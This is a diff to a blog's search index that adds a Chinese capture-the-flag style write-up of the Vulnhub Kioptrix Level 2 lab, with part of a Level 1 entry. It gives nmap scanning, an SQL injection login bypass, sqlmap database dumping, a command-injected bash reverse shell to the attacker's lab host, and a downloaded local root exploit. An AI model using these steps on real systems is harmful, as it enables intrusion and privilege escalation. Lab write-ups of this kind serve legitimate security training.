@@ -1,6 +1,47 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Kioptix Level 2</title>
+    <url>/2021/12/02/Kioptrix-Level-2/</url>
+    <content><![CDATA[<p><strong>靶机: 192.168.249.130<br>kali: 192.168.249.129</strong></p>
+<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>arp-scan -l</code><br><img src="/2021/12/02/Kioptrix-Level-2/1.png"></p>
+<p><code>nmap -sV 192.168.249.130</code>—查看开放端口</p>
+<p><img src="/2021/12/02/Kioptrix-Level-2/2.png"></p>
+<p>—-<strong>访问下80端口</strong>—-<br><img src="/2021/12/02/Kioptrix-Level-2/3.png"></p>
+<p>发现是个登录框先试试万能密码</p>
+<p><strong>username:</strong><code>admin&#39; or 1=1#</code><br><strong>password:</strong><code>123(任意密码)</code></p>
+<p><strong>发现可以登陆，即存在sql注入</strong></p>
+<p><img src="/2021/12/02/Kioptrix-Level-2/4.png"></p>
+<h4 id="二、0x00漏洞利用-sql注入"><a href="#二、0x00漏洞利用-sql注入" class="headerlink" title="二、0x00漏洞利用(sql注入)"></a>二、0x00漏洞利用(sql注入)</h4><p><strong>sqlmap跑一下数据</strong></p>
+<p><em><em>登陆框抓包,因为sql注入在username处，在username处标记</em>(减少测试时间),然后将数据包复制到1.txt中,再用sqlmap跑</em>*</p>
+<p><code>sqlmap -r 1 -level 3 -risk 2</code> –<br><img src="/2021/12/02/Kioptrix-Level-2/7.png"></p>
+<p><font color="red"><strong>sql注入盲注</strong></font><br><code>sqlmap -r 1 --dbs --level 4 --risk 3 -D &quot;webapp&quot; -T &#39;users&#39; -C &#39;id,password,username&#39; --dump</code>  –<strong>爆出用户名为admin，密码为5afac8d85f</strong></p>
+<p><img src="/2021/12/02/Kioptrix-Level-2/11.png"></p>
+<p><font color="red"><strong>成功登录</strong></font></p>
+<h4 id="二、0x01漏洞利用-rce-amp"><a href="#二、0x01漏洞利用-rce-amp" class="headerlink" title="二、0x01漏洞利用(rce&amp;)"></a>二、0x01漏洞利用(rce&amp;)</h4><p><strong>进入后PING框，尝试命令执行</strong><br><img src="/2021/12/02/Kioptrix-Level-2/8.png"><br>发现可以命令执行，但当前为apache权限</p>
+<p><img src="/2021/12/02/Kioptrix-Level-2/9.png"></p>
+<p><code>1&amp; bash -i &gt;&amp; /dev/tcp/192.168.249.132/4444 0&gt;&amp;1</code> -<strong>先弹shell到本地，此时为apache权限需要提权</strong></p>
+<p><img src="/2021/12/02/Kioptrix-Level-2/10.png"></p>
+<p><code>lsb_release -a</code>–<strong>查看内核</strong></p>
+<p><img src="/2021/12/02/Kioptrix-Level-2/12.png"></p>
+<p><code>searchsploit CentOS  4.5</code>–<strong>查找有无可利用的漏洞</strong></p>
+<p><img src="/2021/12/02/Kioptrix-Level-2/13.png"></p>
+<p>9542.c没法wget,需要wget到kali机上，然后开启simpleHTTPserver<br><code>python -m SimpleHTTPServer 8000</code></p>
+<p><code>wget http://192.168.249.132:8000/9542.c</code></p>
+<p><strong>/var/www/html权限不够无法wget，先切换到tmp目录</strong></p>
+<p><img src="/2021/12/02/Kioptrix-Level-2/14.png"></p>
+<p><code>gcc -o 9542 9542.c</code>—<strong>编译运行即可</strong></p>
+<p><img src="/2021/12/02/Kioptrix-Level-2/15.png"></p>
+<p><strong>—成功root—-</strong></p>
+]]></content>
+      <categories>
+        <category>Vulnhub系列</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Kioptix Level 1</title>
     <url>/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/</url>
     <content><![CDATA[<p><em><strong><strong>靶机</strong>: 192.168.249.129<br><strong>kali</strong>: 192.168.249.132</strong></em></p>
@@ -28,32 +69,6 @@
 <p><code>gcc -o samba 10.c</code>—<strong>编译运行</strong></p>
 <p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/13.png"></p>
 <p><strong>—–搞定—–</strong></p>
-]]></content>
-      <categories>
-        <category>Vulnhub系列</category>
-      </categories>
-      <tags>
-        <tag>Vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Kioptix Level 2</title>
-    <url>/2021/12/02/Kioptrix-Level-2/</url>
-    <content><![CDATA[<p><strong>靶机: 192.168.249.130<br>kali: 192.168.249.129</strong></p>
-<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>arp-scan -l</code><br><img src="/2021/12/02/Kioptrix-Level-2/1.png"></p>
-<p><code>nmap -sV 192.168.249.130</code>—查看开放端口</p>
-<p><img src="/2021/12/02/Kioptrix-Level-2/2.png"></p>
-<p>—-<strong>访问下80端口</strong>—-<br><img src="/2021/12/02/Kioptrix-Level-2/3.png"></p>
-<p>发现是个登录框先试试万能密码</p>
-<p><strong>username:</strong><code>admin&#39; or 1=1#</code><br><strong>password:</strong><code>123(任意密码)</code></p>
-<p><strong>发现可以登陆，即存在sql注入</strong></p>
-<p><img src="/2021/12/02/Kioptrix-Level-2/4.png"></p>
-<h4 id="二、0x00漏洞利用-sql注入"><a href="#二、0x00漏洞利用-sql注入" class="headerlink" title="二、0x00漏洞利用(sql注入)"></a>二、0x00漏洞利用(sql注入)</h4><p><strong>sqlmap跑一下数据</strong></p>
-<p><em><em>登陆框抓包,因为sql注入在username处，在username处标记</em>(减少测试时间),然后将数据包复制到1.txt中,再用sqlmap跑</em>*</p>
-<p><code>sqlmap -r 1 -level 3 -risk 2</code> –<br><img src="/2021/12/02/Kioptrix-Level-2/7.png"></p>
-<p><font color="red"><strong>sql注入盲注</strong></font><br>sqlmap只跑除了数据库webapp和表名user,但没有跑出列<br>手工+脚本注连表名都没注出来<br>不过既然能绕过登陆，那就不需跑用户名和密码了(主要是菜)</p>
-<h4 id="二、0x01漏洞利用-rce"><a href="#二、0x01漏洞利用-rce" class="headerlink" title="二、0x01漏洞利用(rce)"></a>二、0x01漏洞利用(rce)</h4><p><strong>进入后PING框，尝试命令执行</strong><br><img src="/2021/12/02/Kioptrix-Level-2/8.png"><br>发现可以命令执行，但当前为apache权限</p>
-<p><img src="/2021/12/02/Kioptrix-Level-2/9.png"></p>
 ]]></content>
       <categories>
         <category>Vulnhub系列</category>
